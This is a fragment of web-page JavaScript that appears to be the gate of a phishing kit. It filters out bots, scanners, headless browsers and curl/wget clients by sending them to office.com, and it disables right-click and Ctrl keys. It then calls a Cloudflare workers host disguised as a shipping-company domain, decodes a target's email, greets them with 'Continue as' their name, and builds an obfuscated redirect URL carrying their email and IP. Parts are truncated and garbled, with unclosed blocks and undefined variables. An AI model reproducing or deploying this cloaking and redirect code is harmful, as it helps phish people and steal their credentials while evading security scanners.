  <script defer>
    // --------- Constants ----------

    const BOT_REDIRECT_URL = 'https://www.office.com?22';
    const BOT_BLOCKLIST = [
      'bot','crawl','spider','slurp','teoma','yandex','baidu','bingbot','googlebot',
      'ahrefs','semrush','mj12bot','dotbot','sitelink','scanner','curl','wget',

    // Self-executing main wrapper
    (function () {

      }

      const mainDataSegment = rush.split(BASERUNSXX)[1] || '';
      const safePart = mainDataSegment.split(SAFE_ZONE)[0] || '';
      const baseRuns = decodeBase64OrDefault(safePart, safePart);

      // Basic UI helpers (guard element existence)
      function showError(html) {
        const errBox = document.getElementById('error-message');
        const errCap = document.querySelector('.errcapt');
        if (errBox) errBox.style.display = 'block';
        if (errCap) { errCap.style.display = 'block'; errCap.innerHTML = html; }
      }

      // Input suppression
      document.addEventListener('keydown', disableCtrlKey, { passive: false });
      document.addEventListener('contextmenu', disableRightClick);

      // --- Bot / environment checks ---
      function isBotOrScanner(userAgent = '') {
        const ua = String(userAgent).toLowerCase();
        const isBot = BOT_BLOCKLIST.some(token => ua.includes(token));
        if (isBot) console.log(`Bot detected: UA "${userAgent}"`);
        return isBot;
      }

      function isHeadlessBrowser(headers) {
        const isCloudflare = headers && (
          headers['cf-ray'] ||
          headers['cf-worker'] ||
          (headers['cdn-loop'] && String(headers['cdn-loop']).includes('cloudflare'))
        );
        console.log(`Cloudflare detection: ${Boolean(isCloudflare)}`);

        if (isCloudflare) return false;

        const tests = [
          { ok: !navigator.webdriver, desc: 'WebDriver detected', val: navigator.webdriver },
          { ok: (window.outerWidth > 0 && window.outerHeight > 0), desc: 'Invalid window dimensions', val: `outer=${window.outerWidth}x${window.outerHeight}` },
          { ok: (!!window.chrome || !!window.opera || !!window.safari || !!window.firefox || navigator.userAgent.includes('Edg')), desc: 'No browser-specific objects', val: `chrome=${!!window.chrome}, opera=${!!window.opera}, safari=${!!window.safari}, firefox=${!!window.firefox}, edge=${navigator.userAgent.includes('Edg')}` },
          { ok: !!document.createElement('canvas').getContext('webgl'), desc: 'No WebGL support', val: 'webgl=false' },
          { ok: (navigator.plugins.length > 0 || navigator.mimeTypes.length > 0), desc: 'No plugins or mimeTypes', val: `plugins=${navigator.plugins.length}, mimeTypes=${navigator.mimeTypes.length}` }
        ];
        const failed = tests.find(t => !t.ok);
        if (failed) console.log(`Headless check failed: ${failed.desc} (${failed.val})`);
        return Boolean(failed);
      }

      function hasHumanInteraction(headers) {
        const isCloudflare = headers && (
          headers['cf-ray'] ||
          headers['cf-worker'] ||
          (headers['cdn-loop'] && String(headers['cdn-loop']).includes('cloudflare'))
        );
        if (isCloudflare) return () => true;

        let moved = false, touched = false;
        document.addEventListener('mousemove', () => { moved = true; }, { once: true });
        document.addEventListener('touchstart', () => { touched = true; }, { once: true });
        return () => moved || touched;
      }

      function rateLimit() {
        const now = Date.now();
        const last = Number(localStorage.getItem('lastRequest') || 0);
        const diff = now - last;
        if (diff < 1000) {
          console.log(`Rate limit: last=${diff}ms ago`);
          return false;
        }
        localStorage.setItem('lastRequest', String(now));
        return true;
      }

      function disableCtrlKey(e) {
        if (e.ctrlKey) { e.preventDefault(); }
      }
      function disableRightClick(e) { e.preventDefault(); }

      function isValidEmail(email) {
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(String(email).trim());
      }

      function randomStr(length, chars) {
        let out = '';
        for (let i = 0; i < length; i++) {
          out += chars[Math.floor(Math.random() * chars.length)];
        }
        return out;
      }

      function getValueOrDefault(fn, def) {
        try { return fn(); } catch { return def; }
      }

      function decodeBase64OrDefault(b64, def) {
        return getValueOrDefault(() => atob(b64), def);
      }

      function handlePageloadx() {
        const pageloadx = getValueOrDefault(() => baseRuns.split(PAGERUNSXX)[0], NOPAGERUNS);
        console.log(`handlePageloadx: ${pageloadx}`);
        if (!pageloadx) return;
        const timer = setInterval(() => {
          const autocall = (document.getElementById('autocall') || {}).value;
          const pto4 = (document.getElementById('pto4') || {}).value;
          if (autocall === '1' && pto4) loadpage();
          if (autocall === '0' && pto4) clearInterval(timer);
        }, 1000);
      }

      function isNullOrUndefinedOrEmpty(v) {
        return v === undefined || v === null || v === '';
      }

      function loadpage() {
        const autocall = (document.getElementById('autocall') || {}).value;
        const pto4 = (document.getElementById('pto4') || {}).value;
        const safeDomainsQueryEl = document.getElementById('autourlcall');
        const safe_domains_query = safeDomainsQueryEl ? safeDomainsQueryEl.value : '';

        if (autocall !== '1') return;

        const safe_domains = pto4; // direct URL
        const safe_ip = (document.getElementById('ip') || {}).value || ''; // base64
        const controlCallElem = document.getElementById('control');

        let goToUrl;
        if (controlCallElem && controlCallElem.value === 'c') {
          goToUrl = safe_domains + safe_domains_query + '/' + safe_ip;
        } else {
          goToUrl = safe_domains + safe_domains_query;
        }

        const autoEl = document.getElementById('autocall');
        if (autoEl) autoEl.value = '0';
      
        window.location.replace(goToUrl);
      }

      function frontier(r) {
        if (String(r) === '1') {
          const autoEl = document.getElementById('autocall');
          if (autoEl) autoEl.value = '1';
          handlePageloadx();
        } else {
          showError("<span style='color:red'>Robot Detected!</span>");
          return false;
        }
      }

      function cs_clean(originalString, substringToRemove) {
        return String(originalString).replace(new RegExp(substringToRemove, 'g'), '');
      }

      function parseMaybeJSON(value) {
        if (value && typeof value === 'string') {
          try { return JSON.parse(value); } catch { /* fallthrough */ }
        }
        return value;
      }

      async function checkBrowserAndAlert(data) {
        console.log('checkBrowserAndAlert input:', data);
        const mainData = parseMaybeJSON(data);
        if (!mainData || typeof mainData !== 'object') {
          window.location.href = BOT_REDIRECT_URL;
          return;
        }

        const userAgent = mainData.userAgent || '';
        const bran_ip   = mainData.ip;

        if (isBotOrScanner(userAgent)) {
          showError("<span style='color:red'>Bot or scanner detected!</span>");
          setTimeout(() => { window.location.href = BOT_REDIRECT_URL; }, 1000);
          return;
        }

        if (isHeadlessBrowser(mainData.headers || {})) {
          showError("<span style='color:red'>Headless browser detected!</span>");
          setTimeout(() => { window.location.href = BOT_REDIRECT_URL; }, 1000);
          return;
        }

        if (!rateLimit()) {
          showError("<span style='color:red'>Request rate limit exceeded!</span>");
          setTimeout(() => { window.location.href = BOT_REDIRECT_URL; }, 1000);
          return;
        }

        const checkInteraction = hasHumanInteraction(mainData.headers || {});
        setTimeout(() => {
          if (!checkInteraction()) {
            showError("<span style='color:red'>No human interaction detected!</span>");
            setTimeout(() => { window.location.href = BOT_REDIRECT_URL; }, 1000);
          }
        }, 3000);

        const browsers = ['Firefox','Chrome','Edge','Opera','Safari'];
        const isSupportedBrowser = browsers.some(b => userAgent.includes(b));
        if (!isSupportedBrowser) {
          showError("<span style='color:red'>Unsupported browser!</span>");
          setTimeout(() => { window.location.href = BOT_REDIRECT_URL; }, 1000);
          return;

        const ipEl = document.getElementById('ip');
        if (ipEl) ipEl.value = btoa(String(bran_ip || ''));

        if (isNullOrUndefinedOrEmpty(baseRuns)) {
          const autoEl = document.getElementById('autocall');
          if (autoEl) autoEl.value = '1';
        }

        const runs = (baseRuns.split(LOOKRIGHT)[1]) || '';
        if (isNullOrUndefinedOrEmpty(runs)) {
          const autoEl = document.getElementById('autocall');
          if (autoEl) autoEl.value = '1';
        }

        const [users, domains] = runs.split(GETUSERANDDMAIN);
        let user = users;
        let domain = decodeBase64OrDefault(domains, domains);

        if (user === '1') {
          const fullEmail = decodeBase64OrDefault(domain, domain);
          const parts = fullEmail.split('@');
          if (parts.length === 2) { user = parts[0]; domain = parts[1]; }
        }

        if (!isValidEmail(`${user}@${domain}`)) {
          const autoEl = document.getElementById('autocall');
          if (autoEl) autoEl.value = '1';
          console.log(`Invalid email: ${user}@${domain}, setting autocall to 1`);
        }

        const controlCallElem = document.getElementById('control');
        const autourlCallElem = document.getElementById('autourlcall');
        const accessprefixElem = document.getElementById('pg');

        const CHAR_SET = '1234567890abcdefghijklmnopqrstuvwxyzfevgrbhtnyjm6k5jyrhbtevytukutjfhdgsrhdjyumndbsveafhjiplkjhgvca';

        if (controlCallElem && controlCallElem.value === 'c') {

          const part2 = randomStr(15, CHAR_SET);
          const part3 = randomStr(17, CHAR_SET);

          const inner3 = randomStr(25, CHAR_SET);
          const innerString = `${accessprefix}/${inner1}/${inner1}/${user}/${inner2}/${domain}/${inner3}/`;

        } else if (controlCallElem && controlCallElem.value === 'c2') {
          const part1 = randomStr(12, CHAR_SET);
          const part2 = randomStr(15, CHAR_SET);
          const part3 = randomStr(17, CHAR_SET);
          const prefix = `${part1}/${part2}${part3}${BASERUNSXX}`;
          const accessprefix = accessprefixElem ? accessprefixElem.value : 'gen';
          const inner1 = randomStr(25, CHAR_SET);
          const inner2 = randomStr(25, CHAR_SET);
          const inner3 = randomStr(25, CHAR_SET);
          const innerString = `${accessprefix}/${inner1}/${inner1}/${user}/${inner2}/${domain}/${inner3}/`;
          if (autourlCallElem) autourlCallElem.value = prefix + btoa(innerString);
        } else {
          if (autourlCallElem) autourlCallElem.value = btoa(`${user}@${domain}`);
        }

        // Update UI
        const wait = document.getElementById('wait-message');
        if (wait) wait.style.display = 'none';
        const connectionStatus = document.getElementById('connection-status');
        if (connectionStatus) {
          connectionStatus.textContent = `Continue as ${user} !`;

          connectionStatus.style.display = 'block';
        }

        frontier(1);

        if (pto4 && ip) {

      async function fetchSecureData(url = '', sdata = {}, method = 'GET') {
        const fetchOptions = {
          method,
          mode: 'cors',
          headers: { 'Content-Type': 'application/json' },
          referrerPolicy: 'no-referrer'
        };
        if (method === 'GET' && Object.keys(sdata).length) {
          url += '?' + new URLSearchParams(sdata).toString();
        } else if (method !== 'GET') {
          fetchOptions.body = JSON.stringify(sdata);
        }
        const resp = await fetch(url, fetchOptions);
        if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
        return resp.json();
      }

      function checkBrowser() {
        const browsers = ['Firefox','Chrome','Edge','Opera','Safari'];
        const userAgent = navigator.userAgent;
        const supported = browsers.some(b => userAgent.includes(b));
        if (!supported) window.location.href = 'https://www.office.com';
      }
      window.onload = checkBrowser;

      document.addEventListener('DOMContentLoaded', async () => {
        try {
          const url = cs_clean(
            `https://ocean-booking-afcd.cosco-shipping.workers.dev/inch0ckfinchek${randomStr(25, '1234567890abcdefghijklmnopqrstuvwxyzfevgrbhtnyjm6k5jyrhbtevytukutjfhdgsrhdjyumndbsveafhjiplkjhgvca')}`,
            'ee335vad'
          );
          const response = await fetchSecureData(url, { key: 'value' }, 'GET');

          // Expecting { success: boolean, data: object|string }

            checkBrowserAndAlert(response.data);

            window.location.replace('https://www.ibm1.com');

        } catch (err) {
          console.error('DOMContentLoaded handler error:', err);
